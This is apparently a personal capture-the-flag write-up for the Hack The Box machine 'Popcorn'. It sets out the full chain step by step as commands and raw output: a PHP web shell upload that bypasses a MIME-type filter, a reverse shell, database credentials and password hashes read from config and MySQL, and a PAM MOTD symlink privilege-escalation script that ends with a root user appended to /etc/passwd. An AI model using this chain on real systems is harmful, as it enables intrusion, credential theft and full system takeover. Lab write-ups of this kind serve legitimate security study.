
### Initial access
Nmap
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIAn8zzHM1eVS/OaLgV6dgOKaT+kyvjU0pMUqZJ3AgvyOrxHa2m+ydNk8cixF9lP3Z8gLwquTxJDuNJ05xnz9/DzZClqfNfiqrZRACYXsquSAab512kkl+X6CexJYcDVK4qyuXRSEgp4OFY956Aa3CCL7TfZxn+N57WrsBoTEb9PAAAAFQDMosEYukWOzwL00PlxxLC+lBadWQAAAIAhp9/JSROW1jeMX4hCS6Q/M8D1UJYyat9aXoHKg8612mSo/OH8Ht9ULA2vrt06lxoC3O8/1pVD8oztKdJgfQlWW5fLujQajJ+nGVrwGvCRkNjcI0Sfu5zKow+mOG4irtAmAXwPoO5IQJmP0WOgkr+3x8nWazHymoQlCUPBMlDPvgAAAIBmZAfIvcEQmRo8Ef1RaM8vW6FHXFtKFKFWkSJ42XTl3opaSsLaJrgvpimA+wc4bZbrFc4YGsPc+kZbvXN3iPUvQqEldak3yUZRRL3hkF3g3iWjmkpMG/fxNgyJhyDy5tkNRthJWWZoSzxS7sJyPCn6HzYvZ+lKxPNODL+TROLkmQ==
|   2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyBXr3xI9cjrxMH2+DB7lZ6ctfgrek3xenkLLv2vJhQQpQ2ZfBrvkXLsSjQHHwgEbNyNUL+M1OmPFaUPTKiPVP9co0DEzq0RAC+/T4shxnYmxtACC0hqRVQ1HpE4AVjSagfFAmqUvyvSdbGvOeX7WC00SZWPgavL6pVq0qdRm3H22zIVw/Ty9SKxXGmN0qOBq6Lqs2FG8A14fJS9F8GcN9Q7CVGuSIO+UUH53KDOI+vzZqrFbvfz5dwClD19ybduWo95sdUUq/ECtoZ3zuFb6ROI5JJGNWFb6NqfTxAM43+ffZfY28AjB1QntYkezb1Bs04k8FYxb5H7JwhWewoe8xQ==
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.12
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Dir scan
```
200     http://popcorn.htb/index
200     http://popcorn.htb/index
200     http://popcorn.htb/rename/index
200     http://popcorn.htb/rename/index
200     http://popcorn.htb/test
200     http://popcorn.htb/torrent/browse
200     http://popcorn.htb/torrent/comment
200     http://popcorn.htb/torrent/config
200     http://popcorn.htb/torrent/download
200     http://popcorn.htb/torrent/edit
200     http://popcorn.htb/torrent/hide
200     http://popcorn.htb/torrent/index
200     http://popcorn.htb/torrent/index
200     http://popcorn.htb/torrent/login
200     http://popcorn.htb/torrent/logout
200     http://popcorn.htb/torrent/preview
200     http://popcorn.htb/torrent/rss
200     http://popcorn.htb/torrent/secure
200     http://popcorn.htb/torrent/stylesheet
200     http://popcorn.htb/torrent/thumbnail
200     http://popcorn.htb/torrent/upload_file
200     http://popcorn.htb/torrent/validator
301     http://popcorn.htb/rename
301     http://popcorn.htb/torrent
301     http://popcorn.htb/torrent/admin
301     http://popcorn.htb/torrent/css
301     http://popcorn.htb/torrent/database
301     http://popcorn.htb/torrent/health
301     http://popcorn.htb/torrent/images
301     http://popcorn.htb/torrent/js
301     http://popcorn.htb/torrent/lib
301     http://popcorn.htb/torrent/PNG
301     http://popcorn.htb/torrent/readme
301     http://popcorn.htb/torrent/templates
301     http://popcorn.htb/torrent/torrents
301     http://popcorn.htb/torrent/upload
301     http://popcorn.htb/torrent/users

```

We can create user  to upload file
``` {17}
POST /torrent/torrents.php?mode=upload HTTP/1.1
Host: popcorn.htb
Content-Length: 1316
Cache-Control: max-age=0
Origin: http://popcorn.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx27RJaDlFIjnAUGv
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://popcorn.htb/torrent/torrents.php?mode=upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: /torrent/index.php=; /torrent/=; /torrent/torrents.phpfirsttimeload=1; /torrent/torrents.php=; saveit_0=5; saveit_1=0; PHPSESSID=e592044354694aa330e49d0ea4bb08fd

------WebKitFormBoundaryx27RJaDlFIjnAUGv
Content-Disposition: form-data; name="torrent"; filename="clean_shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>

------WebKitFormBoundaryx27RJaDlFIjnAUGv
Content-Disposition: form-data; name="filename"

```


We see content-type application/x-php which fillter our shell
First upload valid torrent file
```bash
echo "test data" > test.txt
mktorrent -a http://popcorn.htb -o valid_file.torrent test.txt

```
After that we have the upload img part which we can use to upload our webshell
![[Assets/Pasted image 20260912083456.png]]

We have to modify header `Content-Type: application/x-php` to `Content-Type: image/png` because this will triger back end to check logic filter out content our file is o php file or not. After modify the back end wont check the fiel we upload is php just check is that img file.
```
POST /torrent/upload_file.php?mode=upload&id=77a6c95f9fb68d213f87c24c7ff54efd55010695 HTTP/1.1
Host: popcorn.htb
Content-Length: 338
Cache-Control: max-age=0
Origin: http://popcorn.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZzPJzYNpFFpThLcK
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://popcorn.htb/torrent/edit.php?mode=edit&id=77a6c95f9fb68d213f87c24c7ff54efd55010695
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: /torrent/index.php=; /torrent/=; /torrent/torrents.php=; saveit_0=5; saveit_1=0; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=e592044354694aa330e49d0ea4bb08fd

------WebKitFormBoundaryZzPJzYNpFFpThLcK
Content-Disposition: form-data; name="file"; filename="webshell.png.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>

------WebKitFormBoundaryZzPJzYNpFFpThLcK
Content-Disposition: form-data; name="submit"

Submit Screenshot
------WebKitFormBoundaryZzPJzYNpFFpThLcK--

```
we have webshell
```
┌──(kali㉿kali)-[~/HTB/Popcorn]
└─$ curl http://popcorn.htb/torrent/upload/77a6c95f9fb68d213f87c24c7ff54efd55010695.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                             
```
Now reverse shell
```
┌──(kali㉿kali)-[~/HTB/Popcorn]
└─$ penelope --oscp-safe --no-log -p 443
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => popcorn 10.129.38.79 Linux-i686 👤 www-data(33) 😍 Session ID <1>

id




[+] ⭐ Agent deployed via /usr/bin/python
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@popcorn:/var/www/torrent/upload$ 

```

```
www-data@popcorn:/var/www$ mysql -u torrent -p'SuperSecret!!'
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 84
Server version: 5.1.37-1ubuntu5.5 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use torrenthoster;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> use torrenthoster;
Database changed
mysql> show tables;
+-------------------------+
| Tables_in_torrenthoster |
+-------------------------+
| ban                     | 
| categories              | 
| comments                | 
| log                     | 
| namemap                 | 
| news                    | 
| subcategories           | 
| users                   | 
+-------------------------+
8 rows in set (0.00 sec)

mysql> select username, password from users; 
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| Admin    | d5bfedcee289e5e05b86daad8ee3e2e2 | 
| test     | 098f6bcd4621d373cade4e832627b4f6 | 
+----------+----------------------------------+
2 rows in set (0.00 sec)


```
### Lateral movement
```
www-data@popcorn:/var/www$ cat /var/www/torrent/config.php
<?php

  //rename this file to config.php
  /* turn on verbose error reporting (15) to see all warnings and errors */
  error_reporting(15);

//include "forumdb.php";

  //define a generic object to hold all the configuration variables
  class object {};

  //declare an instance of the generic object
  $CFG = new object;
  //declare root directory
  $CFG->dirroot     = dirname(__FILE__);

  //Edit This For TORRENT HOSTER Database
  //database configuration
  $CFG->host = "localhost";
  $CFG->dbName = "torrenthoster";       //db name
  $CFG->dbUserName = "torrent";    //db username
  $CFG->dbPassword = "SuperSecret!!";   //db password

```

### Priv escalation

We using this to priv escalation https://www.exploit-db.com/exploits/14273 we have to create HOME var for user cuz www-data is low user dont have home var. And to trigger it we must have ssh to local host so we create ssh key to do this.


```
# 1. Environment configuration and clean up
export HOME=/var/www && cd /var/www
rm -rf .cache .ssh

# 2. Create the malicious symlink pointing to /etc/passwd
ln -s /etc/passwd /var/www/.cache

# 3. Generate SSH keys for www-data and add to authorized_keys
mkdir -p /var/www/.ssh
ssh-keygen -t rsa -f /var/www/.ssh/id_rsa -N "" -q
cp /var/www/.ssh/id_rsa.pub /var/www/.ssh/authorized_keys

# 4. Strictly enforce correct SSH permissions
chmod 700 /var/www/.ssh
chmod 600 /var/www/.ssh/authorized_keys

# 5. Trigger the PAM MOTD vulnerability via passwordless SSH login
ssh -o "StrictHostKeyChecking=no" -i /var/www/.ssh/id_rsa www-data@localhost "exit"

# 6. Verify /etc/passwd ownership (Should now be owned by www-data)
echo -e "\n=== FILE PASSWD OWNERSHIP STATUS ==="
ls -l /etc/passwd



```

```
┌──(kali㉿kali)-[~/HTB/Popcorn]
└─$ openssl passwd -1 -salt root anh
$1$root$AZkUxvRWAmfZOIbrda4hj0


echo 'anh:$1$root$AZkUxvRWAmfZOIbrda4hj0:0:0:root:/root:/bin/bash' >> /etc/passwd

www-data@popcorn:~$ echo 'anh:$1$root$AZkUxvRWAmfZOIbrda4hj0:0:0:root:/root:/bin/bash' >> /etc/passwd
www-data@popcorn:~$ su anh
Password: 
root@popcorn:/var/www# cd /root
root@popcorn:~# ls
root.txt
root@popcorn:~# cat root.txt
39420fb6a7f28a2c8a08cd5ceadf1958


```